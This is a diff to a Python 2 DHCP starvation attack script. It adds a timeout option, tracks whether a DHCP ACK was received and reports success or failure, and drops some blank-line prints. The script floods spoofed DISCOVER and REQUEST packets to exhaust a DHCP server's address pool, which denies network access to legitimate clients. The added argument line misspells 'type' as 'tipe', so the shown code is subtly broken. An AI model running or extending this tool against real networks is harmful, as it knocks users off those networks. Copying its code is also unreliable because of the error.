@@ -30,10 +30,12 @@ _dhcp_option_value = None
 _dhcp_option_code = 12
 _transactions = {}
 _current_network_interface = ""
+_ack_received = False
 
 parser = ArgumentParser(description='DHCP Starvation attack script')
 parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
 parser.add_argument('-d', '--delay', type=int, help='Set delay time in seconds (default: 1)', default=1)
+parser.add_argument('-t', '--timeout', tipe=int, help='Set receiving timeout in seconds (default: 10)', default=10)
 parser.add_argument('-n', '--not_send_hostname', action='store_true', help='Do not send hostname in DHCP request')
 parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
 parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
@@ -70,11 +72,9 @@ def send_dhcp_discover():
     eth = Ethernet_raw()
     dhcp = DHCP_raw()
 
-    print "\r\n"
     print _info + "Sending discover packets..."
     print _info + "Delay between DISCOVER packets: " + cINFO + str(args.delay) + " sec." + cEND
     print _info + "Start sending packets: " + cINFO + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + cEND
-    print "\r\n"
 
     while True:
 
@@ -93,11 +93,12 @@ def send_dhcp_discover():
         sendp(discover_packet, iface=_current_network_interface, verbose=False)
         _transactions[transaction_id] = client_mac
 
-        if int(time() - _start_time) > 30:
-            print "\r\n"
-            print _success + "IP address pool is exhausted: " + cSUCCESS + \
-                str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + cEND
-            print "\r\n"
+        if int(time() - _start_time) > args.timeout:
+            if _ack_received:
+                print _success + "IP address pool is exhausted: " + cSUCCESS + \
+                    str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + cEND
+            else:
+                print _error + "DHCP Starvation failed!"
             system('kill -9 ' + str(getpid()))
 
         sleep(int(args.delay))
@@ -105,6 +106,7 @@ def send_dhcp_discover():
 
 def send_dhcp_request(request):
     global _start_time
+    global _ack_received
     if request.haslayer(DHCP):
         xid = request[BOOTP].xid
         yiaddr = request[BOOTP].yiaddr
@@ -113,10 +115,8 @@ def send_dhcp_request(request):
 
         if request[DHCP].options[0][1] == 2:
             if args.find_dhcp:
-                print "\r\n"
                 print _success + "DHCP srv IP: " + cSUCCESS + siaddr + cEND
                 print _success + "DHCP srv MAC: " + cSUCCESS + Base.get_mac(_current_network_interface, siaddr) + cEND
-                print "\r\n"
                 pprint(request[DHCP].options)
                 exit(0)
 
@@ -145,6 +145,7 @@ def send_dhcp_request(request):
                 print _error + "Unknown error!"
 
         if request[DHCP].options[0][1] == 5:
+            _ack_received = True
             print _success + "ACK from:   " + cSUCCESS + siaddr + cEND + " your client ip: " + cSUCCESS + yiaddr + cEND
 
         if request[DHCP].options[0][1] == 6:
